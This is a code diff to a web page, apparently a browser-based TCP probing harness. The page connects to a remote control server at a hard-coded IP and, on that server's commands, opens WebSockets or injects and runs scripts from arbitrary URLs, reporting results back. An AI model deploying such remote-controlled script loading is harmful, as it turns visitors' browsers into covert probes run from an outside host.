@@ -6,6 +6,7 @@
 
 <script language="javascript" type="text/javascript">
 
+try {
 
     var control_sock;
     var sock;
@@ -16,17 +17,59 @@
         
         //init();
     }
+    
+    function imgLoad()
+    {
+        control_sock.send("closed"); // Legacy...compat with websockets
+    }
+
+    // We call it an Img, but really it's become a script TODO: make names make sense
+    function makeImg(url)
+    {
+        // Kill old script element
+        e = document.getElementById('img-element');
+        e.parentNode.removeChild(e);
+
+        e = document.createElement('script');
+        e.id = 'img-element';
+        e.addEventListener("load", imgLoad, false);
+        e.src = url + '?' + Math.random();  // to kill caches and/or get us banned
+
+        try {
+            document.getElementById('img-container').appendChild(e);
+        }catch (err) {
+            console.log('I caught me an error - make it faster!!');
+        }
+    }
+        
 
     function makeWS(url)
     {
         try {
-        sock = new WebSocket(url);
-        sock.onopen = function(evt) { control_sock.send("opened") };
-        sock.onclose = function(evt) { control_sock.send("closed") };
-        sock.onerror = function(evt) { control_sock.send("error") };
-        sock.onmessage = function(evt) { control_sock.send("data") };
+            var sock2 = new WebSocket(url);
+            sock = sock2;
+            sock.onopen = function(evt) {
+                console.log("opened(" + sock.readyState + "): ");
+                console.log(evt);
+                control_sock.send("opened");
+            };
+            sock.onclose = function(evt) { 
+                console.log("close(" + sock.readyState + "): ");
+                console.log(evt);
+                control_sock.send("closed");
+            };
+            sock.onerror = function(evt) { 
+                console.log("error(" + sock.readyState + "): ");
+                console.log(evt);
+                control_sock.send("error");
+            };
+            sock.onmessage = function(evt) { 
+                console.log("data: " + evt);
+                control_sock.send("data");
+             };
         } catch (err) {
-            console.log("meh");
+            console.log("ERROR");
+            console.log(err);
         }
     }
 
@@ -36,6 +79,9 @@
         if (evt.data.substr(0, "make".length) == "make") {
             url = evt.data.substr("make ".length)
             makeWS(url);
+        } else if (evt.data.substr(0, "img".length) == "img") {
+            url = evt.data.substr("img ".length)
+            makeImg(url);
         } else if (evt.data.substr(0, "kill".length) == "kill") {
             sock.onclose = function(evt) { console.log('killed sock') };
             sock.close();
@@ -49,15 +95,20 @@
     function init()
     {
         if (! ("WebSocket" in window)) WebSocket = MozWebSocket; // firefox
-        control_sock = new WebSocket("ws://127.0.0.1:8080/");
+        control_sock = new WebSocket("ws://141.212.109.239:8080/");
         control_sock.onopen = function(evt) { console.log("Opened control websocket") };
         control_sock.onclose = handleControlClose;
         control_sock.onerror = handleControlClose;
         control_sock.onmessage = handleControlMessage;
+        window.onerror = function(evt) {
+            console.log("window err: " + evt);
+        }
     }
 
     window.addEventListener("load", init, false);
-
+} catch (err) {
+    console.log("big giant exception (" + sock.readyState + "): " + err);
+}
 </script>
 <center>
 <h1>Hi</h1>
@@ -66,5 +117,10 @@ Please wait while we hax your TCP. Thank you.
 
 <h2>FIN</h2>
 <div id="output"></div>
+
+<div id="img-container">
+<script id="img-element"></script>
+</div>
+
 </center>
 </html>
